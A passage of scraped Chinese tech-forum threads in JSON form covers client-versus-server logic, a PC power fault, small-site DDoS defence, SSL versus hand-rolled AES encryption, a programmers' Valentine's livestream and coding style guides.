的让客户端节省点电量让手机续航更长一点挺好的。\r", "我自己是负责服务端这边的。", " 嗯 这个问题之前没有很重视 的确很重要", " 是的 现在我就是只有两层 想慢慢分出来 被坑到了..", "我感觉应该看具体情况吧，我是做 iOS 的，一般数据处理是很希望放在服务端来做的，客户端在渲染页面之前，对请求到的数据做过度的处理，会造成反应缓慢，卡顿的感觉(当然也可以进行一些优化，做预处理)，但是考虑到 APP 健壮性，还是放在服务端处理比较好，这样造成的结果就是，如果线上出现了某个问题，我会先查是否是自己的问题或者是数据返回的问题，一般后台背锅就比较多了(虽然客户端已经做了比较多的安全处理，但是某些数据还是不可避免的会发生)，这种情况下，后台直接修改代码或数据，就可以立马结局，而如果放在客户端，就 iOS 而言，审核就够难受的了", " 我上面回答的正是这个意思~", "设计到自己懒得去实现为止。就是设计 api 总有个一界限。过了界限，自己就要加班去实现。。。我个人觉得不用想太多，以加班为平衡点来是最实际的。什么？扩展性，放心好了。其他人看别人的 api 设计都是一坨屎", "能 App 本地处理的，就不需要去向服务器请求；", "现在每次穿过的数据都要遍历一遍。。。。。", "也许你们想要的是 graphql", "写 app 应该也是有成熟的体系了，如果 app 是核心业务的话后台只是处理器而已， dirty work 自然多。\r", "\r", "这里和 app 的性质其实有很大的关系，如果涉及较多的交互那无可厚非数据得干净，如果更多的动态变化的展示那就自己处理数据。", "试试 graphql", "逻辑处理放在服务端比较好，放在客户端维护起来太不方便了。", "一般而言，数据和逻辑是放到服务端，展示层是客户端的事，这是大原则。\r", "\r", "在可能的基础上，尽量提高接口的友好程度，方便客户端拿到数据后能方便处理，这是原则 2 。\r", "\r", "流量是肯定要考虑的，我自己也做 iOS 客户端，他这么说肯定是瞎扯。现在弱网络，如地铁，火车、汽车等情况其实相较以前更常见了。本地在可能的情况下，都是要做 cache 的。\r", "\r", "理由 3 ，我倒觉得未必成立。其实，数据实际传输的时间消耗不一定高，往往是链接建立的耗时更高。所以一般建议，尽量一个请求搞定数据，而不要让客户端连续调用多个 http 请求来为一个界面加载数据。如果服务端只是将几个 http 请求包起来，统一做个门面，其实这事也不难。比客户端回调套回调好处理多了。", "只能协商。逻辑放在客户端或者服务端 (gateway) 里实现并没有绝对的定论，因为这都包含了业务逻辑。以固有逻辑来定论我觉得都是错误的，要根据具体场景、团队、业务逻辑来判断放哪实现**最为合适**。业务逻辑是难以根据平台区分的。协商会有几点考虑因素：\r", "\r", "1. 安全性。有些数据只能在服务端计算。\r", "2. 性能开销。根据不同场景，可以放在客户端，也可以放在服务端。\r", "3. 可复用性。业务逻辑实现在客户端，就难以复用了；但实现在服务端，又要考虑通用性。\r", "4. 人为因素。观点争执不下，沟通成本太高等等。\r", "\r", "我觉得解决这个问题的最好办法，不是讨论这块逻辑究竟该放哪里。因为每个新 feature 都得讨论一遍接口，会非常麻烦。\r", "而是应该由一个人去负责一个 feature 的完成，由同一个人完成前后端的代码，即所谓的全栈。这样的好处在于：\r", "\r", "1. 避免沟通交流上的争执。在编程领域，一个人干活往往比两个人效率更高。\r", "2. 只有经历过同样的场景，才会换位思考，知道对方的难点，才会互相体谅。\r", "3. 当一个人去实现，因为放哪做都是自己做，才更有可能去思考代码结构，真正考虑业务逻辑放哪实现**最为合适**。\r", "4. 当一个人去跨端，会培养全局意识，对于技术发展也是有好处的。\r", "\r", "你可能会觉得让前端来学服务端难度太大。这是有前提的，前提是你的项目架构要清晰可维护，新手进来能快速上手，当项目可维护性做得很好，有很好的结构，那么入门门槛就只在于语言了。对于学一门新语言，对稍微有点经验的开发者来说不算难事吧。待对方实现好代码后，你可以参与 code review ，把控项目质量。", "理论上，我觉得服务器的接口是尽可能的考虑到通用性，返回基础数据，由客户端根据自己的业务需要来自行处理然后渲染出来。这个在 web 端一直没什么问题，但是自从 IOS 和 Android 出来后情况又不一样了，考虑到发包的成本，基本上服务端都要包揽了所有的数据处理的逻辑，这么搞可以理解，但是如果出现不同的平台同一个页面不同的功能设计就很尴尬了，为了不同平台的处理逻辑，又要拆分出一个接口~", "大部分情况下都是因为客户端懒吧。。。", " 看大家评论,也不完全是懒,也有很多无奈的地方.app 和 web 还是不太一样,ios 要过审什么的所以很多只能放服务端", " 过审核我们是添加一个配置项目， ios 取到以后再 client 端关掉相关功能"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这台式电脑是我两年前自己组装的，工作得很正常。但是最近开始就有个奇怪的毛病：</p>\n<ol>\n<li><strong>偶尔</strong>开机会没有反应，但是能开机之后工作<strong>很正常</strong>。</li>\n<li>出现这种情况之后，拔插电源线、主板开关后再开机都<strong>没有用</strong>。</li>\n<li>而且插上电源时，主板和显卡的指示灯是亮的，但是电源键按下去依旧<strong>一点反应</strong>都没有，就像电源键坏了一样，听不到主板上有<strong>任何地方</strong>是通电运行了。</li>\n<li>后来我摸索出解决办法，就是把电脑的电源开关关上，等个半小时或以上再按就好了，甚至有时要等一天，期间什么都<strong>没做</strong>，自己就会好。</li>\n<li>更奇怪的是，能开机后重启一直都没有问题，但是能开机后正常关机，<strong>很大几率</strong>会开不了机，情况跟前面四点一模一样。</li>\n</ol>\n<p>自检很多次依旧无果，当年攒机时算过电源功率是够的，主板显卡芯片没烧，经常除尘，机箱干净如新，电脑也是普通使用，没超频没硬改。想了很久可能会有以下可能：</p>\n<ul>\n<li>电源键坏了，但是坏得如此有规律我非常不解，当作是一种可能，准备买电源按钮排除一下。</li>\n<li>主机电源电压不稳，但是即便是电压不稳，开不了机时主板怎么都会通电吧？不知道电压不稳时主板会有什么症状，请遇到过的朋友告知。</li>\n<li>主机电源老化，功率不够，但是如果是功率不够，那能开机的时候为什么游戏又能跑得很欢呢？实在是想不通。</li>\n</ul>\n<p>我遇到的这个问题有点奇怪，搜索排查后找不到问题根源，可能我有些方面考虑不到，还请各位经验丰富的 V 友指点一下，不懂的也请帮忙顶顶贴，多谢。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>因为这个问题不是百分比重现，所以我会缓慢更新本贴，多谢各位解答，有几个重点的问题说一下：</p>\n<ol>\n<li>我买了新的单独开关按钮，不能开机的时候接到主板上，开不了，手动用钥匙改锥的金属部分接触主板上电源 pin 针，一点反应也没有。</li>\n<li>主板电池扣过，没用，说实话我对这技嘉 GA-Z97-D3H 的质量还是有点信心的，越发觉得是电源问题了。</li>\n<li>前天出现了正常运行的时候突然关机的情况，但是室内其他电器没有异常，我更怀疑是电源的问题了。请问电源电压不稳有什么办法可以检测？年后准备租别的地方，到时候还不行，就能排除是室内电压不稳。</li>\n<li>电源是海韵的 SEASONIC G-650。</li>\n<li>我的机箱有点紧凑，打算天气好的时候把主机全拆了再装一次，顺便主板刷个最新的 BIOS，买个新的主板电池。如果还是没事，感觉电源的锅大一点。</li>\n</ol>\n</div></div>"], "reply": "79", "tittle": "组装台式电脑的电源经常点不亮，但是能开机后却又一切正常是什么回事？", "comment": ["你说的电源键是机箱跳线还是短接主板开机的？", "我以前台式机也是类似问题，后来发现主板上面有根线有点松，没插紧，接触不良。。。。\r", "机箱拆开看看？把所有的线重新插一插，尤其是和电源按钮相关的线。。。", "啥牌子的~~~电源", "我碰见过和你一模一样的问题, 机器只要开起来就没问题, 关了就可能起不来了.\r", "我印象中好像换过主板电池(其他做过什么我已经不记得了), 不过我不觉得是这个原因, 只记得后来换了台机器...\r", "而且这问题很不好定位, 换了零件也不确定是真的原因.", "试试直接短接 atx 的 14 （ PS_ON 绿）、 15 （ GND 一般黑）试试 针对 20pin ？\r", "如果每次都能顺利起来 建议检查机箱按键。。。\r", "起不来考虑电源或板子问题。", "应该是主板电池没电了，\r", "在主板上，找一个纽扣电池，换掉。\r", "\r", "你可以从其他主板上拆一个下来，装上去试试。", "你的电脑怕冷", "直接短接主板跳线开机试试，如果这个没问题就是开关和开机接口接触不良", "一样碰到过这问题，看看有什么办法", "主板 BIOS 电池没电了？", "我也感觉比较像是主板纽扣电池没电了  去超市买个同尺寸的换换排除一下！", "我这也有俩电脑有同一个问题 百思不得其解（偶尔）\r", "\r", "开机亮灯 然后断电 然后感受到风扇在减速\r", "\r", "1 秒后，又再次开启…… 成功开机\r", "\r", "（相当于自动关机了一次又自动开了一次）", "主板纽扣电池难道不是用来维持 BIOS 的设定数据的吗，拔了纽扣电池也是可以开机的啊", "可能机箱上的开机键接触不良\r", "直接主板上 power2 个针脚短接开机看看", "我有时关机后会自动开机……求解", "主板或者电源的问题", "BIOS 固件重新刷一下应该就能解决，我遇到过和你一样的问题。", "楼主，你的确定你的电源键是好的？", "电容老化了", "换个主板", "我的台式机之前也这样，后来发现 1) 显卡插槽不稳，会松动 2) 机械硬盘有毛病，尤其是第一点，现在我都把机箱倒下来放，怕重力影响插槽位置 orz", "很大几率是主板电源线那一大坨  有接触不良的", "之前我也遇到这样的，就是开机前要充电，一开始的时候接通电源等一会就能开机，后面越来越久，发展到要看运气 。去网上查看到有人说是电源的电容有问题。我换了个电源就正常了", "检查 bios 电池，如果不是这里的问题，估计是主板电容有问题了", "我的也出现过这种情况，按开机键的时候没反应，过几秒就开了。严重的时候反复自动开关机。用的是海盗船 VS550,换了这个电源之后就从来没有出现问题了。可以建议楼主换个电源试试。", "在电脑城碰到过开机很难开，开起来正常这种情况两次：\r", "第一种：使用有问题的拖线板导致开机电压不稳不够，无法启动，启动后正常，换拖线板或者直接插墙上的插孔排除法。\r", "第二种：电源有问题，同样是开机电压不够，更换电源。", " 一开始是跳线，后来是短接，都不行。", " 插过不行，主板的电源线很难拔出来，有空重新把主机拆了重装", " SEASONIC G-650", " 是啊，可惜我没钱换机子", " 除了用十字刀和钥匙，还能用什么短接一下，我现在有点怀疑人生了", " 其实主板电池没电也能开机啊", " 哈哈，多谢有你暖贴:)", " 我就把 power 那两个针脚用金属同时接触，应该没操作错误吧", " @", " 电池没电能让电脑开机一点反应没用？主板电池没电也能开机吧", " 对，所以感觉锅不在她", " 用金属同时接触了，这算短接吧，不行呢", " 谢谢顶贴", " 确定是一模一样？我过年的时候刷刷看", " 换了独立的电源开关线了，不行", " 主板电容？", " 排除所有都不行就拿回去修修看吧", " 可是显卡会使电脑开机一点反应没？我的显卡有托架，很稳喔", " 全部插拔过，不行", " 要充电？我这是台式主机喔，好吧，年后换个电源试试", " 检查过了", " 有什么电源可以推荐？", " 1 、插线板是 APC ，其他电器都没事，感觉可能是问题 2", " @", " @", " 谢谢顶帖~我解决后会更新的", " \r", "我那时候主板 内存都换过一遍，还是解决不了", "G-650 是宽幅电源，工作电压 :100V ~ 240V ，结合你说其他电器正常，那就不是电压不稳的缘故了，我也觉得机器电源出问题概率比价大，瞎猜大概是 Boost 电容 Bomb 了，如有替换电源，替换法替换一下。\r", "\r", "要测电压稳不稳的话，用万用表从机器插座上测或者直接买个优利德的计量插座，计量插座一般带电压显示功能。\r", "\r", "如果真是电源问题的话，推荐买振华 LEADEX 系列 ，或者海盗船中高端的相应型号。", "计量插座还能测电流强度和整机功耗，备一个蛮好的。", "我的台式机也会这样，我估计是电源的锅，本来想换个机箱和电源，后来想想算了，现在都是笔记本插显示器用。", "要么主板上的供电电容，要么电源里的电容", "给个建议，同一排插，哪怕是 APC ，又如何，上面如有大型电器，比如冰箱启动，微波炉启动，那电涌是不要不要的，所以 机器和其他电器最好分开供电。", "你的电源长期负担大，出问题，可能就是因为和大型电器在同一排插上引起的。", "替换法 借个电源来试试看。所以附近有个好基友能借来部件是很重要的……", "是不是天气冷了就这样? 我很早以前的一款华硕主板也是这样, 记得网上说可能是主板电容的问题.", "你描述的问题现象是电容出问题的才会出现的，电容本来就是个充电放电的东西", "八成电源挂了。\r", "先看看主板有没有电容爆掉，没有的话换电源试试。", "该不会也是楼上楼下有装修的造成电压不稳吧…… 之前在一位卖电脑的商家那里听到过这个案例，新机器发过去总是莫名其妙出问题，拿回来检查又检查不出来，最后发现是因为新楼装修的多，电压不稳…… 233", "硬件配置高？额定功率没算好 电源买小了？", " 电容充电", "r#31 @", " 20pin 24pin 左 4 右 4 绿色黑色短接，用镊子，曲别针什么的都可以\r", "电源接地试一下", "你可以按照这个检测一下，重点测 24pin 。\r", "之前和 LZ 一模一样的问题，没想到我不是一个人。也是技嘉+海韵的组合，虽然型号和你不一样。\r", "那时候想来想去也想不明白，根据最小系统，电源、主板， CPU 和内存。内存确定没问题， CPU 是散片没保修。\r", "就直接把主板和电源都去保修了，最后主板说修好了，电源京东给换新了。\r", "\r", "目前正常。", "楼上一些回复都应该不是问题所在。我家电压肯定没问题，这个插座上就插了电脑和显示器。电源买的比较大，一直负载很小在工作。", "我也遇到过，可能是电源问题。\r", "我当时换了主板、显卡，都没用，后来换了电源就好了，问题再也没出现过。", "要么是主板\r", "要么是电源\r", "\r", "我自己同样问题，就是主板的问题，去修了下主板，换了个主板上的电源开关的 2 个针脚就好了。", "真电工问题，我也不懂，当初买的奔 3 二手本（ 201{1,2}年）也不知道什么原因挂了。", "我只想说，注意接地！注意接地！注意接地！\r", "看看你们家地线是不是真的接地了", " 看了你两个回复，情况跟你还真是一模一样啊，我的插座也是只有电脑和显示器，之前忙，现在准备走保修流程，幸亏保修纸和单据都在\r", "\r", "不过我的电源保修过了，如果买新的话，有什么推荐？我这电脑也用三年了，买太好的没必要，有什么性价比高的具体型号推荐吗", " 我的电源保修过了，如果买新的话，有什么推荐？我这电脑也用三年了，买太好的没必要，有什么性价比高的具体型号推荐吗", " 针脚怎么换？", " 二手笔电啊，那就更复杂了", " 在一线城市苦苦租房，没有地线", "可以参考这个帖子： ", " 电源保修好几年了吧。。怎么会过？要买的话就随便买吧，现在要我选择肯定买个便宜的~", " 找的市场里师傅弄的，自己也不会弄。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>嗯。</p>\n</div></div>"], "reply": "29", "tittle": "今天要少敲点 bug，早点下班过节", "comment": ["今天要少敲点 bug ，早点下班避免其他人过节造成的交通拥堵。\r", "嗯。", "今天要在键盘上少啪两下 就可以在床上和女票多啪两下", "BOSS ：今天过节，我们就不加班到 10 点了，大家 9 点走吧", "大家预定的女朋友今天要早点过去拿！", "BOSS ：小伙子有女朋友了吗，没有？那今天留下来加个班吧", "BOSS ：小伙子有女朋友了吗，有啦！那今天留下来加个班吧", "应该多制造 BUG ，让全体成员一起过节。", "不写码也不过节啊……", "一个人去看爱乐之城，还有谁。", "今天要在键盘上少啪两下 就可以在床上和女票多啪两下", "BOSS ：小伙子有女朋友了吗，没有？那今天留下来加个班吧", " 这么多评论就服你", "老大我今天要早点走，要去酒吧喝闷酒", " me", " 哈哈", "今天不加班", "哈哈哈 女朋友？ 不存在的", "早上地铁碰到一只萝莉太怂没有要联系方式.\r", "下班回去再碰到妹子我就要", "小胡子哥都有节日过了", "这是在喂狗粮", " 放心，再碰到你依然是怂", " 三年起步，基本死刑。", "惊现胡子哥", "早点回去给 DVA 买个皮肤", " hah , 开口好难哎\r", "  嗯...是合法萝莉", "今天要少敲点 bug ，早点下班假装有节可以过", "你今天记得一定不要抽烟哦，  要不然，    烟灰掉下去，你女朋友会爆哦。", "BOSS ：好好加班，只有努力工作赚钱，下个月你才有可能当爹。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我们公司是租用了阿里云 ECS ，流量不大，都不到阿里云流量清洗的最低阈值，但是 300QPS 以上的话，网站就要挂掉了</p>\n<p>现在是 nginx+php 环境，想在 nginx 上加一层 waf ，能基础防御 ddos 就行。希望各位大神可以指点一下。</p>\n</div></div>"], "reply": "20", "tittle": "新人求教，各位公司都用什么防御 DDOS 或者 CC 攻击", "comment": ["大企业一般都买的硬件防 D 设备。", " 我们是个小公司，每天动态接口请求流量也就在 100 万左右", "加 WAF 也防不了 DDOS ， WAF 只是应用层的防御 CC 攻击还行， DDOS 还是得从流量上解决吧。", "淘宝上买佛山高仿机房，一个月 1000 多，然后做个 nginx 转发\r", "别指望 waf 能防住，还是要靠硬件", "CC 各种 CDN 各种 WAF 就能缓解，仅限缓解， CC 的太狠，免费版的人家估计会给你回源直接死源站，收费版的,,,,拉小黑屋吧，然后响应极其缓慢。\r", "\r", "DDOS ，除非自有机房或租独立服务器改路由加硬件，否则，云上的机器，无解。", "ddos 无解\r", "\r", "cc 可以统计 log ，然后自动封 ip", "300QPS 网站就挂掉，这个不是攻击的问题吧，至少不是 DDOS 的问题，建议楼主先上个 WAF 开启观察模式看下，然后根据情况调整下防御策略", " 每个请求平均是 0.003 秒处理完成，程序优化到这一步应该可以了吧。", " #8 那 300QPS  网站挂掉是什么原因呢？", " 压力过大，处理不过来了。反应特别慢。", " 看看是不是后端服务器的压力， nginx 应该随便配都可以几千并发", "DDOS 防护用硬防， CC 用 WAF", "3000QPS 就挂掉……建议优化一下 web 服务器环境", "DDoS 只能靠上游清洗。因为你的带宽被挤爆了的话，你这端上什么软硬件都没用。\r", "300 多 qps 更可能是 cc ，做 profiling 然后优化，平时多注意性能问题。性能不达标先检查代码。", "国内用金盾？国外 F5 ， radware ，思科, checkpoint, hillstone 等等都有用", "金盾  奥顿！？", " 一看就是老司机，推荐的都是很靠谱的设备，楼主还可以试试绿盟的清洗设备", "4 层 DDoS 让全站 CDN 抗\r", "我很好奇， 4 层的 DDOS ， CDN 商会知道被攻击的是谁么\r", "\r", "7 层 DDoS ，试试 WAF", "ECS 前面加一个 SLB ，挂了就换，挂了就换", "cdn 应该是最佳实践吧"]},
{"content": ["<div class=\"topic_content\">有加密传输数据的需求，看了下很多都是使用 SSL 库来实现的，如果我不用 SSL ，而是通过调用诸如 Crypto 这些库加密通讯，有什么区别啊？\r<br>PS ：我这里是 TCP 通讯，有自己设计数据包格式，而不是 HTTP 通讯。</div>"], "reply": "24", "tittle": "SSL 加密通讯与手动调用 AES 库对数据加密通讯有什么区别？", "comment": ["如果手动调用 AES 库加密通讯的话， 那你应该还要实现秘钥交换协议，数字签名等等。 实现秘钥交换协议的时候，比如 DH 秘钥交换协议，你还需要实现一些算法，比如生成大素数(64bit 以上)的算法，快速求幂算法等等。我对密码学也不是特别了解，不过感觉自己写的话工作量不小， 安全性也不一定好。", " 如果我直接把密钥给另一个人，使用客户端前需要提前设置才能通信呢？比如说像 s h a d o w s o c k s 这样的。", "SSL 通讯加密，可以在发起链接时通讯双方协商密钥，且保证未获许可的第三方试图攻破密钥是计算上不可能的。\r", "\r", "你说的 AES 自行对通讯保文加密通讯，如果没有理解错的话，应该是指通讯双方事先已经知道共享的通讯密钥。在多次通讯中，这个密钥除非同时改变，否则双方无法通讯。\r", "一般来说，这样的通讯方式会有以下问题：\r", "1. 无法知道中间是否有第三者已经攻破密钥并截获通讯双方的内容，发起中间人攻击。\r", "2. 更换密钥代价大，必须借助其他安全的信道更新密钥（例如通讯双方同时更新软件）\r", "3. 多次使用同一密钥会使该密钥被攻破的可能性大大增加，尤其是通讯协议是有模式的，可以通过字典攻击倒推出密钥原文。", " 错了 使用 aes 传输同样的数据多次 也不会增加被破解的风险，这是又有初始向量决定的。", "AES 是一种对称块加密算法。 TLS 是一个协议。 TLS 的上层协议不需要是 HTTP ，只要 TCP 能承载的 TLS 一般都可以。 shadows 不使用 TLS 的原因是 TLS 握手时证书是明文传输的，容易被识别且开销较大。", "手动调用的方法一般是\r", "先用 RSA 交换 AES 密钥，之后用 AES 加密通信。", "总结一下就是从 cipher 到 cryptographic protocol 中间还有很多很多步。", "没问题， 就像 @", " 说的那样先用 RSA 传输对称密钥。 至于防范中间人攻击， 参考 ssl 的校验方法。\r", "事实上私有协议好多也是自行加密的。", "1. 楼主没说数据包格式要设计成什么样的，如果你把所有东西都设计得和 TLS 一样，那就没有区别\r", "2. SSL 加上 TLS 有 6 个版本，修了不少漏洞，自己设计一个又有很多漏洞要修\r", "3. 事先共享密钥的方法不能提供前向安全性, 用 RSA 交换密钥也不行\r", "4. 这些东西看看维基百科就都知道了\r", "\r", "简单来说，如果对安全性要求高，肯定不会自己手写加密的过程，这玩意太复杂了", " 如果你说的是 AES 针对选择文本攻击的抵抗能力，这个我是理解的。\r", "\r", "现在我们假设 LZ 的软件只采用一种特定模式的 AES 加密，并且已经分发到了足够多的网络节点上，然后我们在通讯旁路截取数据。\r", "\r", "我们分析这些截取数据可以找到什么规律？\r", "如果 LZ 仅仅做了 AES 加密的话，基本上我们可以分析出节点通讯的模式。\r", "譬如是否有类似 Hello 报文，如何响应，\r", "然后我们可以用重放这些报文，试图更改其中一些内容来验证一下对报文内容的猜测。\r", "\r", "你还觉得这种方式不会泄密么？", " 不仅有初始向量，切片填充的时候还会填充随机串，使得每次加密的结果都不一样。字典倒推是不大现实了。", " 不行的，你相同的文本用 AES 加密每次都出不一样的密文。", "  \r", "\r", "给定密钥， IV ，和同一种模式， AES 怎么可能加密出不一样的密文？\r", "你让解密方怎么解？", "  iv 不是固定的，你实践一下就懂了。", " 来个实例验证吧。\r", "\r", "AES256 CFB\r", "\r", "明文：\r", "Veni, vidi, vici\r", "密钥：\r", "ThePhantomOfTheOperaIsThere\r", "IV ：\r", "8c 8a 88 6c 24 e7 18 a1 91 7c 20 c4 f8 3e d2 5c\r", "结果：\r", "07 22 ff c3 .....\r", "\r", "其他不变，明文换成：\r", "Very good\r", "结果\r", "07 22 e3 cb ....\r", "\r", "注意到重复的 07 22 了吗？\r", "\r", "开头的这一部分，是绝对可以分析的。\r", "如果恰巧知道报文的前面几字节是例如报文长度这样的信息，是有可能逐步攻破的。", " \r", "\r", "IV 在实践中的确是不固定的，但通讯双方也需要明文交换 IV 。\r", "所以你总是有办法让 IV 变成固定的。", " 我记得 AES 有三种加密模式，有一种貌似相同的文本每次加密都得出同样的报文，不知是否记错了。", "直接用 ssl 来通讯，是没有问题的啊，并不一定是 http 协议， ssl 只是承载数据而已，", "  你每个消息都可以带不同的 iv ， 你直接把 iv 发给对方就可以了，让监听的人根据 iv 去破解啊", "  但实际情况是，中间人不仅仅是监听人，它也可以主动发起通讯啊。\r", "所以这种情况下，除非设计协议的时候有考虑 IV 部分，不然中间人可以一直用 同一个 IV 来玩啊", "AES 是对称加密\r", "RSA 是非对称加密\r", "如果我没记错， SSL 会用非对称加密协商获得对称加密的密钥，之后使用对称加密传输\r", "\r", "SSL 是标准，就像 JSON\r", "你可以自定义格式，也可以用 JSON ，或者使用 XML\r", "你认为是人人都用的 JSON 好，还是自己定一个格式好？", "  \r", "\r", "更高级的玩法是，既然你用的是固定密钥，那我只需要在 可执行映像中找到你的密钥就可以了。\r", "除非 LZ 能保证，所有分发的软件都是 code sign 保护过的。", "自己用 AES ，需要解决两个问题。第一，密钥交换的问题，通常用 RSA 或者 DH 交换密钥。第二就是中间人攻击，通常是使用证书的。", " 纯 aes 都是预设密码的。还有 iv 你可以重用的，但是协议里都有时间戳，防止重放攻击的。"]},
{"content": ["<div class=\"topic_content\">非单身的就不祝福了。\r<br>\r<br>为什么？\r<br>\r<br>不想祝福。</div>"], "reply": "1", "tittle": "祝各位单身狗们情人节快乐！", "comment": ["没人？有点尴尬 \r", "你也节日快乐"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>事情是这个样子的，鉴于在很多地方都可以看到程序员单身的窘境，比如这个： <a href=\"https://www.v2ex.com/t/339974\" rel=\"nofollow\">https://www.v2ex.com/t/339974</a></p>\n<p>所以我就想了主意：<strong>我们不如在情人节（明天）直播面基吧！！！</strong></p>\n<h2>直播的主要目的有三个：</h2>\n<p><strong>1.让广大群众更了解程序员这个群体，我们也是正儿八经的人好吧。</strong></p>\n<p><strong>2.给对程序员感兴趣的妹子们一个撩汉的机会，每次都会为妹子们精挑细选五个程序员</strong></p>\n<p><strong>3.面基，认识更多的朋友</strong></p>\n<h2>申请方式</h2>\n<p><strong>填写申请表： <a href=\"http://laravist.mikecrm.com/9VqVRk9\" rel=\"nofollow\">http://laravist.mikecrm.com/9VqVRk9</a></strong></p>\n<p>都是一些基本的信息。</p>\n<h2>具体的直播内容</h2>\n<p>暂时由我作为主持，会聊到以下内容：</p>\n<p><strong>1.会聊你的基本信息</strong></p>\n<p><strong>2.对感情的一些看法</strong></p>\n<p><strong>3.生活日常（比如看片，兴趣爱好等）</strong></p>\n<p><strong>4.不介意的话，也可以直播一下你的房间</strong></p>\n<p><strong>5.其他的吹水时间</strong></p>\n<h2>直播间地址</h2>\n<p>熊猫 TV 搜<strong>非程勿扰</strong>，或者直接点链接： <a href=\"http://www.panda.tv/615943\" rel=\"nofollow\">http://www.panda.tv/615943</a></p>\n<p><strong>感兴趣的可以先关注，我们明天晚上九点开始！！</strong></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>我还是太过 naive，没人报名。。。</strong></p>\n</div></div>"], "reply": "23", "tittle": "单身的程序员们，我们情人节来一次直播面基吧！", "comment": ["顶顶更健康~！", "说基不说吧，文明你我他", " 歧义歧义", "太傻了。。。除非长得帅，否则姑娘哪有心思去了解啊，都去看欧巴了", "还不如举办程序员打字比赛……", "感觉第一个目的已经不能达到了", "看来楼主得先组织下妹子", "然后到场的都是男同胞（滑稽", "为什么女澡堂里的全是男同胞即视感.jpg", "楼主要组织一堆妹纸一起", " 真心觉得做这些事情，还是更要摆脱这些事情。。。扩大交际圈才是正道啊", " 哈哈哈，这个貌似是前提条件", " \r", " 很尴尬", " 有机会找妹子来直播啊", "你信不信最后话题都会变成争论世界上最好的语言", "想起了昨晚上某司 CEO 在熊猫上直播如何成为人生赢家", " 这个还好吧", " 嗯哼？", " 说🐔必说吧 文明去 tama", "晚上准点打开直播  学习面基", " 我还是太 naive ，都没人报名，估计面基不起来了", " 敢问楼主昨晚面基成功了吗", " 然而并没有，就周天跟群里的约线下的了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/hnlq715\" rel=\"nofollow\">https://github.com/hnlq715</a></p>\n</div></div>"], "reply": "21", "tittle": "祝大家情人节快乐，没有女朋友的来互 fo 一把，起码我们男朋友不少 ;-)", "comment": ["好吧 ", " =.=", "来吧， ", "好久没写代码了 ", "gay 里 gay 气的   :P", "放 github 的时间又到了。\r", "\r", "看 Github ，楼主长沙的吧，而且还是搞底层的，好叼啊", "欢迎交流前端~ ", "来啊 互相伤害啊 ", "基情四射的样子", "哈哈哈 果然是最大的男性交友平台 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前我们公司用的 erp 系统（别的公司开发）用到窗体技术，想知道是不是 applet 实现的</p>\n</div></div>"], "reply": "11", "tittle": "Java 在浏览器中显示的窗体是不是只能用 applet 实现", "comment": ["怕楼下的不知道 applet 是啥。\r", "js-小程序-微信\r", "java-applet-浏览器", " Javascript ≠ Java （指正）", "是的， Applet 是在浏览器中以插件形式运行的 Java 程序", "没多少浏览器支持 applet 了", "当年，巨硬推过一段时间的 applet ，后来和 sun 闹翻了。学 Java 的时候，最后几章还在讲 applet 呢\r", " 服气。", "applet 处于被抛弃的时候", " \r", " \r", " \r", "求问现阶段想用 Java 写网页的话怎么搞，目标就是把安卓那一套 xml ＋ kotlin 在浏览器上跑", " 写网页还能逃开 HTML ？", " 就是任性不想写， jade 还行原生 html 真不喜欢，还有就是 css(sass ， less, etc...)搞不透彻，累了", " 不想写就不应该选浏览器这个平台， Android/iOS/Qt/. NET ，不都能写应用么", " 很多语言可以编译成 js ，研究一下吧\r", "参考这个： webassembly 、 asm.js"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Repo: <a href=\"https://github.com/geekan/path-to-cs-engineer\" rel=\"nofollow\">https://github.com/geekan/path-to-cs-engineer</a></p>\n<p>收录的比较谨慎，都是领域精华，方向上偏后台 /AI ，信息量控制在比较低的级别，够大家逛一逛了 :)</p>\n</div></div>"], "reply": "2", "tittle": "情人节写了个（金色传说）程序员之路 // 手动捂脸", "comment": ["跟老司机上车", "没毛病，跟着我大喊：一人我饮酒醉。"]},
{"content": "", "reply": "16", "tittle": "想到阿里有 Java 规范，那是不是行业 top 的公司也有 Python 规范、前端规范之类的？能不能分享一下？", "comment": ["向 Google 看齐就好啦", "1, 官方的\r", "2, Google 的", "pep8 挺好的啊", "前端的 JavaScript 部分用 eslint 工具的话，常用 eslint-standard 推荐规范或 AirBnB 的规范……\r", "PHP 的 PSR 规范似乎已经是标准了……", "Google Style Guides: Our C++ Style Guide, Objective-C Style Guide, Java Style Guide, Python Style Guide, R Style Guide, Shell Style Guide, HTML/CSS Style Guide, JavaScript Style Guide, AngularJS Style Guide, Common Lisp Style Guide, and Vimscript Style Guide are now available.", "每个公司都有一份 General Coding Standard ，对应每个项目，在此基础上衍生出 Software Coding Standard （ SCS ），这个是 CMMI 里面要求的，在做项目之前都必须有的。", "pep8 是大比例标准。 google 写法的在 github 上不多见。 google 下面还有一种 chromium 的标准。", "google/yapf 算不算 我写完后都会 yapf 过一遍", " 只是在学软件工程里看到过这个软件能力成熟度，公司真的按照这个执行吗？", "and php style", " #9 话说用 autopep8 在 vscode 上我老是绿线一条条，用了 yapf 后好很多。", "有，我们公司才 10 名程序员，都严格执行了。有 CI 自动检查。甚至还有工具把不符合规则的代码转换成符合规则。\r", "Python 有 autopep8, Ruby 有 Rubocop, Javascript 有 ESlint 。这些 linter 现在都有 autofix 功能了。", "用 pylint 插件， 不合规范的自动划线， 不改不舒服", "然而只统一命名方式和缩进并没太多用。。清晰可读的逻辑靠这些提高不了多少", " eslint 都是检查空格"]},
